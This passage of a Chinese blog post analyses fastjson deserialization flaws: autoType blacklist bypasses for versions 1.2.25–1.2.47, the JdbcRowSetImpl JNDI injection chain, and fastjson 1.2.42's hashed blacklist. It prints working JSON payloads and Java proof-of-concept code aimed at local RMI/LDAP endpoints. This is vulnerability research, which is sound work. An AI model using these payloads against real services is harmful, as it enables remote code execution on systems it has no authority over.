class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680692205068-d02f1d33-8459-4a31-a147-4cd5f3231b17.png#averageHue=%23f7f6f3&clientId=u8272b843-0f56-4&from=paste&height=823&id=ud8a5b648&name=image.png&originHeight=1029&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=258463&status=done&style=none&taskId=ua35ae797-9813-4f96-a233-755d5bd49e7&title=&width=1536" alt="image.png"></p>
<h3 id="（3）对两种poc绕过手法的分析"><a href="#（3）对两种poc绕过手法的分析" class="headerlink" title="（3）对两种poc绕过手法的分析"></a>（3）对两种poc绕过手法的分析</h3><p>首先来说说限制，基于<code>JNDI+RMI</code>或<code>JDNI+LADP</code>进行攻击，会有一定的<code>JDK</code>版本限制。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RMI利用的JDK版本 ≤ JDK 6u132、7u122、8u113</span><br><span class="line">LADP利用JDK版本 ≤ JDK 6u211 、7u201、8u191</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680618501501-f26961a1-0027-40a3-ade6-8415e2b1c2d4.png#averageHue=%2395c7f8&clientId=u8272b843-0f56-4&from=paste&id=u043dac77&name=image.png&originHeight=441&originWidth=1250&originalType=url&ratio=1.25&rotation=0&showTitle=false&size=153472&status=done&style=none&taskId=u5a11668f-49db-4182-92da-4147872a394&title=" alt="image.png"></p>
<h4 id="①第一种poc（1-2-25-1-2-47通杀！！！）"><a href="#①第一种poc（1-2-25-1-2-47通杀！！！）" class="headerlink" title="①第一种poc（1.2.25-1.2.47通杀！！！）"></a>①第一种poc（1.2.25-1.2.47通杀！！！）</h4><p>然后我们先来看<strong>第一种</strong><code>poc</code>。<br>我们仔细欣赏下第一种<code>poc</code>的<code>payload</code>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;a&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Class&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>&#125;,<span class="string">&quot;b&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://127.0.0.1/exp&quot;</span>,<span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>我们会发现，加上<code>&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;</code>就会绕过原本的<code>autoType</code>，由此我们可以猜测，针对未开启<code>autoType</code>的情况，<code>fastjson</code>的源代码中应该是有相关方法去针对处理的，并且利用我们的这种方式，正好可以对应上。<br>于是我们直接去查看源代码，翻到<code>checkAutoType</code>的地方，可以看到，如果没开启<code>autoType</code>，就会有以下两种加载方式：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680674920966-732fd782-4668-43e1-ab57-518011562ee9.png#averageHue=%23f9f6f4&clientId=u8272b843-0f56-4&from=paste&height=818&id=u0e63a7b2&name=image.png&originHeight=1023&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=222886&status=done&style=none&taskId=uc25d8b68-2fa3-4f6f-b967-be1c558c509&title=&width=1536" alt="image.png"><br>第一种是从<code>mappings</code>里面获取，也就是上图中的第<code>727</code>行代码，点进去之后可以看到：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680675503367-43dbf581-5b0e-4015-a487-80393adc3525.png#averageHue=%23f9f7f5&clientId=u8272b843-0f56-4&from=paste&height=814&id=u23c92503&name=image.png&originHeight=1018&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=235656&status=done&style=none&taskId=udb00512b-97b5-4dc2-a17c-9a854e30dcd&title=&width=1536" alt="image.png"><br>如果获取不到就采用第二种方法，也就是第<code>728</code>-<code>730</code>行代码，从<code>deserializers</code>中获取。<br><code>deserializers</code>是什么呢？可以看<code>fastjson-1.2.25.jar!\com\alibaba\fastjson\parser\ParserConfig.class</code>的第<code>172</code>-<code>241</code>行，里面是内置的一些类和对应的反序列化器。<br>但是<code>deserializers</code>是<code>private</code>类型的，我们搜索<code>deserializers.put</code>，发现当前类里面有一个<code>public</code>的<code>putDeserializer</code>方法，可以向<code>deserializers</code>中添加新数据：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680676108771-e490841e-0441-414e-9c9b-6576ab7d68ee.png#averageHue=%23f9f7f5&clientId=u8272b843-0f56-4&from=paste&height=818&id=u3c907910&name=image.png&originHeight=1023&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=216672&status=done&style=none&taskId=u7c1f0f64-f171-454a-b4f5-c10d8f20685&title=&width=1536" alt="image.png"><br>于是我们全局搜索该方法，发现就一个地方调用了，而且没办法寻找利用链：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680677151929-7f9c95c7-40f3-42b7-9aa2-6aa9006a3203.png#averageHue=%23f5f1eb&clientId=u8272b843-0f56-4&from=paste&height=254&id=u1e390450&name=image.png&originHeight=318&originWidth=1141&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=54312&status=done&style=none&taskId=u5ae08ae6-959f-44c7-988e-868b4e1c830&title=&width=912.8" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680677222460-54192f2d-d247-480a-bc53-a1212febd02f.png#averageHue=%23f9f7f7&clientId=u8272b843-0f56-4&from=paste&height=817&id=ub9d96a5b&name=image.png&originHeight=1021&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=207736&status=done&style=none&taskId=u5bc96a3b-66e7-4e77-90cf-cb36de10fb1&title=&width=1536" alt="image.png"><br>所以继续看第一种方法，从<code>mappings</code>获取的。可以看到，<code>mappings</code>这里也是<code>private</code>：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680678056676-759e117f-c793-4b66-a991-82536a9233df.png#averageHue=%23f9f7f4&clientId=u8272b843-0f56-4&from=paste&height=815&id=uab06c50b&name=image.png&originHeight=1019&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=235080&status=done&style=none&taskId=u63292f58-ebad-4aa1-af92-dddaba04808&title=&width=1536" alt="image.png"><br>搜索<code>mappings.put</code>，可以看到在<code>TypeUtils.loadClass</code>中有调用到：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680678132990-8ab3025b-3eae-41c2-8576-5ec4e2151e55.png#averageHue=%23f9f7f6&clientId=u8272b843-0f56-4&from=paste&height=819&id=uf9087d28&name=image.png&originHeight=1024&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=210200&status=done&style=none&taskId=uaf540557-27de-4b01-9810-0fedd3a39be&title=&width=1536" alt="image.png"><br>于是我们全局搜索，可以看到有如下五处调用：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680678561460-ac869226-ef1c-46f8-b492-c66e23b48473.png#averageHue=%23f5f4eb&clientId=u8272b843-0f56-4&from=paste&height=510&id=u3fb653f7&name=image.png&originHeight=637&originWidth=729&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=75537&status=done&style=none&taskId=ub8b45843-0788-4a52-9ff4-b9ff2a8adc5&title=&width=583.2" alt="image.png"><br>我们一个个看。<br>第一个需要开启<code>autoType</code>：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680678666460-57c58d66-de2a-4cd8-91bc-3fd69a58362e.png#averageHue=%23f9f8f7&clientId=u8272b843-0f56-4&from=paste&height=817&id=u10196591&name=image.png&originHeight=1021&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=210453&status=done&style=none&taskId=u62527907-6716-41f7-b11b-cd1901f3082&title=&width=1536" alt="image.png"><br>第二个要在白名单内，第三个要开启<code>autoType</code>：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680678713501-12502876-12ea-4865-bb64-51340931e820.png#averageHue=%23f9f6f4&clientId=u8272b843-0f56-4&from=paste&height=819&id=u866091a0&name=image.png&originHeight=1024&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=232619&status=done&style=none&taskId=u6cabfd27-4e98-4df7-b4c1-0d0d5a9f720&title=&width=1536" alt="image.png"><br>第四个是在<code>MiscCodec.deserialze</code>中的，貌似没什么限制，我们先放一边：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680678935307-61f42cbd-c46e-4ce1-aa11-e0d0797b376f.png#averageHue=%23faf8f8&clientId=u8272b843-0f56-4&from=paste&height=1213&id=u5b431c62&name=image.png&originHeight=1516&originWidth=1918&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=264604&status=done&style=none&taskId=uf5db69ca-015c-4266-988f-b07ed99f6c1&title=&width=1534.4" alt="image.png"><br>第五个没办法利用，因为传不了参数，跳过：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680679092354-59713c7a-a43d-4311-8f8e-eebb3ae03c5e.png#averageHue=%23f9f7f6&clientId=u8272b843-0f56-4&from=paste&height=815&id=u843988d3&name=image.png&originHeight=1019&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=229811&status=done&style=none&taskId=u050bb634-6bbe-46f8-a87a-6e53a20ccfb&title=&width=1536" alt="image.png"><br>也就是说，只能从<code>MiscCodec.deserialze</code>这里来寻找突破口了。<br>翻到<code>MiscCodec.java</code>的最上面可以看到，这个<code>MiscCodec</code>是继承了<code>ObjectSerializer</code>和<code>ObjectDeserializer</code>的：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680679361943-4d3b8440-1d46-4762-b83b-d5db888b7d58.png#averageHue=%23f9f8f7&clientId=u8272b843-0f56-4&from=paste&height=817&id=uba10225d&name=image.png&originHeight=1021&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=202138&status=done&style=none&taskId=ue202d417-765f-4a06-8fb7-d0b507c2102&title=&width=1536" alt="image.png"><br>因此，可以判断，这个<code>MiscCodec</code>应该是个反序列化器，于是我们去之前的<code>deserializers</code>中看看都有谁用了：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680679573424-d52e1ab6-6e6a-466d-bb4b-5cd24e2c7720.png#averageHue=%23f9f7f1&clientId=u8272b843-0f56-4&from=paste&height=815&id=ucb42f24b&name=image.png&originHeight=1019&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=324362&status=done&style=none&taskId=u19623da7-4382-436c-8e01-4b27e8b2da2&title=&width=1536" alt="image.png"><br>挺多的，结合<code>MiscCodec</code>中一堆的<code>if</code>语句，可以判断，一些简单的类都被放在这里了。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680679621524-a1120b62-9948-44ba-a094-b3980e929f20.png#averageHue=%23f9f7f6&clientId=u8272b843-0f56-4&from=paste&height=823&id=u0a81269b&name=image.png&originHeight=1029&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=196030&status=done&style=none&taskId=uaeae7b27-9ad8-40bd-9aa5-4ec45805273&title=&width=1536" alt="image.png"><br>我们再来看这行代码：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680681095147-04871de3-d1b0-44e1-b6e7-b790e436c355.png#averageHue=%23f9f7f0&clientId=u8272b843-0f56-4&from=paste&height=798&id=u885c1731&name=image.png&originHeight=997&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=225172&status=done&style=none&taskId=u9068ac2d-dcc5-496e-b140-f277d1f3b1f&title=&width=1536" alt="image.png"><br>然后跟进<code>strVal</code>，看看是哪儿来的：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680684014235-07a14705-5567-47ff-be0d-2a24462aff8f.png#averageHue=%23f9f8f2&clientId=u8272b843-0f56-4&from=paste&height=818&id=u11950ef5&name=image.png&originHeight=1022&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=219653&status=done&style=none&taskId=u58d97716-591e-45dc-b0b1-383a44c1c65&title=&width=1536" alt="image.png"><br>继续跟进这个<code>objVal</code>：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680684044565-316ed393-8cf7-40e6-8369-91ce95e250a4.png#averageHue=%23f9f7f1&clientId=u8272b843-0f56-4&from=paste&height=817&id=u4942bea9&name=image.png&originHeight=1021&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=226587&status=done&style=none&taskId=u32a3cea6-c753-46c3-aff4-d787d4b28c0&title=&width=1536" alt="image.png"><br>到这里就很明显了，那红框中的这段代码是什么意思呢？<br>首先，代码中的<code>if</code>语句判断当前解析器的状态是否为<code>TypeNameRedirect</code>，如果是，则进入<code>if</code>语句块中进行进一步的解析。在<code>if</code>语句块中，首先将解析器的状态设置为<code>NONE</code>，然后使用<code>parser.accept(JSONToken.COMMA)</code>方法接受一个逗号<code>Token</code>，以便后续的解析器对其进行处理。接下来，使用<code>lexer.token()</code>方法判断下一个<code>Token</code>的类型，如果是一个字符串，则进入if语句块中进行进一步的判断。在if语句块中，使用<code>lexer.stringVal()</code>方法获取当前<code>Token</code>的字符串值，并与<code>val</code>进行比较。如果不相等，则抛出一个<code>JSON</code>异常；如果相等，则使用<code>lexer.nextToken()</code>方法将<code>lexer</code>的指针指向下一个<code>Token</code>，然后使用<code>parser.accept(JSONToken.COLON)</code>方法接受一个冒号<code>Token</code>，以便后续的解析器对其进行处理。最后，使用<code>parser.parse()</code>方法解析当前<code>Token</code>，并将解析结果赋值给<code>objVal</code>。如果当前<code>Token</code>不是一个对象的结束符（右花括号），则使用<code>parser.accept(JSONToken.RBRACE)</code>方法接受一个右花括号<code>Token</code>，以便后续的解析器对其进行处理。如果当前解析器的状态不是<code>TypeNameRedirect</code>，则直接使用<code>parser.parse()</code>方法解析当前<code>Token</code>，并将解析结果赋值给<code>objVal</code>。<br>根据之前分析的，<code>objVal</code>会传给<code>strVal</code>，然后<code>TypeUtils.loadClass</code>在执行的过程中，会把<code>strVal</code>放到<code>mappings</code>缓存中。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680685220463-5e90e5ba-37f1-4fc1-b70e-70ccab72fc25.png#averageHue=%23fbfaf6&clientId=u8272b843-0f56-4&from=paste&height=83&id=u6a8d9b02&name=image.png&originHeight=104&originWidth=939&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=14724&status=done&style=none&taskId=udd9cf6cb-81e3-4dea-a331-08d782f5c53&title=&width=751.2" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680686190404-6b1a2f02-0b09-4c96-ade4-0a593f179ae0.png#averageHue=%23f9f8f3&clientId=u8272b843-0f56-4&from=paste&height=832&id=u88a62e2c&name=image.png&originHeight=1040&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=221198&status=done&style=none&taskId=ua7860cce-d16a-45f6-b3ff-dbc9cc39e09&title=&width=1536" alt="image.png"><br>加载到缓存中以后，在下一次<code>checkAutoType</code>的时候，直接就返回了，绕过了检验的部分直接执行：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680686570779-d1530da3-d33d-4445-ac30-aca768ef8c78.png#averageHue=%23f9f7f1&clientId=u8272b843-0f56-4&from=paste&height=818&id=u1fc011e7&name=image.png&originHeight=1022&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=240527&status=done&style=none&taskId=ue054fb0f-6d71-41fe-a1c3-d50aca03796&title=&width=1536" alt="image.png"></p>
<h4 id="②第二种poc"><a href="#②第二种poc" class="headerlink" title="②第二种poc"></a>②第二种poc</h4><p>第二种<code>poc</code>的绕过手法在上面的“黑白名单机制介绍”中已经写的很清楚了，直接参考即可。<br>需要注意的是，由于代码是循环去掉<code>L</code>和<code>;</code>的，所以我们不一定只在头尾各加一个<code>L</code>和<code>;</code>。<br>由于1.2.25的代码中有如下代码：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680707261437-1f39a0de-3978-4950-90bd-ec8832701c83.png#averageHue=%23f9f7f6&clientId=u8272b843-0f56-4&from=paste&height=819&id=u10bf0ebc&name=image.png&originHeight=1024&originWidth=1919&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=228052&status=done&style=none&taskId=u174e90ae-3a98-41a5-95c0-f8d68c6a1d8&title=&width=1535.2" alt="image.png"><br>因此我们可以构造如下<code>poc</code>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// ldap 和 rmi都可以</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;a\&quot;:&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;, \&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1389/ift2ty\&quot;, \&quot;autoCommit\&quot;:true&#125;&#125;&quot;</span>;</span><br><span class="line">        JSONObject.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>也可以绕过：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680707199621-7543e63d-9d09-49ec-b393-dd53f474167c.png#averageHue=%23f7f6f4&clientId=u8272b843-0f56-4&from=paste&height=823&id=ub2bbcd38&name=image.png&originHeight=1029&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=249063&status=done&style=none&taskId=u898cebbe-9534-4434-bdf4-00572e66baa&title=&width=1536" alt="image.png"></p>
<h3 id="（4）关于JdbcRowSetImpl链利用的分析"><a href="#（4）关于JdbcRowSetImpl链利用的分析" class="headerlink" title="（4）关于JdbcRowSetImpl链利用的分析"></a>（4）关于JdbcRowSetImpl链利用的分析</h3><p>从上面我们学习了绕过黑白名单的学习，接下来看<code>JdbcRowSetImpl</code>利用链的原理。<br>根据<code>FastJson</code>反序列化漏洞原理，<code>FastJson</code>将<code>JSON</code>字符串反序列化到指定的<code>Java</code>类时，会调用目标类的<code>getter</code>、<code>setter</code>等方法。<code>JdbcRowSetImpl</code>类的<code>setAutoCommit()</code>会调用<code>connect()</code>方法，<code>connect()</code>函数如下：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680703249472-7e9a45dd-3070-4406-a6da-47f43f419fa3.png#averageHue=%23f8f7f4&clientId=u8272b843-0f56-4&from=paste&height=814&id=uc91bdc8b&name=image.png&originHeight=1018&originWidth=1919&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=208033&status=done&style=none&taskId=ufaf4f9a4-8120-49d5-86d6-b40ceb8fea4&title=&width=1535.2" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680703278497-77fe86b9-cb73-4eff-9283-9627c8038964.png#averageHue=%23f8f4d5&clientId=u8272b843-0f56-4&from=paste&height=814&id=ub640fc04&name=image.png&originHeight=1018&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=235897&status=done&style=none&taskId=uaf7d108c-c2a7-4c49-94ad-64ab7612335&title=&width=1536" alt="image.png"><br>我们把这段代码单独拿出来分析：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Connection <span class="title function_">connect</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.conn != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.conn;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.getDataSourceName() != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InitialContext</span> <span class="variable">var1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">            <span class="type">DataSource</span> <span class="variable">var2</span> <span class="operator">=</span> (DataSource)var1.lookup(<span class="built_in">this</span>.getDataSourceName());</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.getUsername() != <span class="literal">null</span> &amp;&amp; !<span class="built_in">this</span>.getUsername().equals(<span class="string">&quot;&quot;</span>) ? var2.getConnection(<span class="built_in">this</span>.getUsername(), <span class="built_in">this</span>.getPassword()) : var2.getConnection();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException var3) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SQLException</span>(<span class="built_in">this</span>.resBundle.handleGetObject(<span class="string">&quot;jdbcrowsetimpl.connect&quot;</span>).toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.getUrl() != <span class="literal">null</span> ? DriverManager.getConnection(<span class="built_in">this</span>.getUrl(), <span class="built_in">this</span>.getUsername(), <span class="built_in">this</span>.getPassword()) : <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一眼就看到了两行异常熟悉的代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InitialContext</span> <span class="variable">var1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line"><span class="type">DataSource</span> <span class="variable">var2</span> <span class="operator">=</span> (DataSource)var1.lookup(<span class="built_in">this</span>.getDataSourceName());</span><br></pre></td></tr></table></figure>
<p>我们可以通过一个简单的小<code>demo</code>快速了解：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">JdbcRowSetImpl</span> <span class="variable">JdbcRowSetImpl_inc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdbcRowSetImpl</span>();</span><br><span class="line">        JdbcRowSetImpl_inc.setDataSourceName(<span class="string">&quot;rmi://127.0.0.1:1099/ift2ty&quot;</span>);</span><br><span class="line">        JdbcRowSetImpl_inc.setAutoCommit(<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680704636327-d3f73ea9-ba77-4dae-9497-adf85d3dca46.png#averageHue=%23f7f6f4&clientId=u8272b843-0f56-4&from=paste&height=814&id=u2def4e4a&name=image.png&originHeight=1017&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=218638&status=done&style=none&taskId=u0024ec07-8c87-4c38-b19f-5f9cb1d75a7&title=&width=1536" alt="image.png"><br>所以之前的两种<code>poc</code>可以直接自定义<code>uri</code>利用成功。</p>
<h2 id="3-fastjson-1-2-42-反序列化漏洞"><a href="#3-fastjson-1-2-42-反序列化漏洞" class="headerlink" title="3. fastjson 1.2.42 反序列化漏洞"></a>3. fastjson 1.2.42 反序列化漏洞</h2><p>首先先下载<code>fastjson 1.2.25</code>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;project xmlns=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class="line">         xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="line">         xsi:schemaLocation=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br><span class="line">    &lt;modelVersion&gt;<span class="number">4.0</span><span class="number">.0</span>&lt;/modelVersion&gt;</span><br><span class="line"></span><br><span class="line">    &lt;groupId&gt;org.example&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;fastjson_1_2_42&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">1.0</span>-SNAPSHOT&lt;/version&gt;</span><br><span class="line"></span><br><span class="line">    &lt;properties&gt;</span><br><span class="line">        &lt;maven.compiler.source&gt;<span class="number">8</span>&lt;/maven.compiler.source&gt;</span><br><span class="line">        &lt;maven.compiler.target&gt;<span class="number">8</span>&lt;/maven.compiler.target&gt;</span><br><span class="line">        &lt;project.build.sourceEncoding&gt;UTF-<span class="number">8</span>&lt;/project.build.sourceEncoding&gt;</span><br><span class="line">    &lt;/properties&gt;</span><br><span class="line"></span><br><span class="line">    &lt;dependencies&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">1.2</span><span class="number">.42</span>&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">    &lt;/dependencies&gt;</span><br><span class="line"></span><br><span class="line">&lt;/project&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680754774564-970f1b59-70ca-4cfa-ac29-fbb87747855f.png#averageHue=%23f8f7f5&clientId=u8272b843-0f56-4&from=paste&height=815&id=u9cfbc8b6&name=image.png&originHeight=1019&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=134211&status=done&style=none&taskId=u4e4b5f20-ee08-46dd-adcd-7d164c8b2ec&title=&width=1536" alt="image.png"><br>直接翻到<code>ParseConfig</code>这里：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680755033617-ea11aae1-5eda-454b-aae8-2c93e8e84f04.png#averageHue=%23f9f7f3&clientId=u8272b843-0f56-4&from=paste&height=816&id=u45eeb0b7&name=image.png&originHeight=1020&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=216441&status=done&style=none&taskId=ud84d2871-aaef-46e1-8a05-6954235af83&title=&width=1536" alt="image.png"><br>可以看到，<code>fastjson</code>把原来的明文黑名单转换为<code>Hash</code>黑名单，但是并没什么用，目前已经被爆出来了大部分，具体可以参考：</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/LeadroyaL/fastjson-blacklist">https://github.com/LeadroyaL/fastjson-blacklist</a></p>
</blockquote>
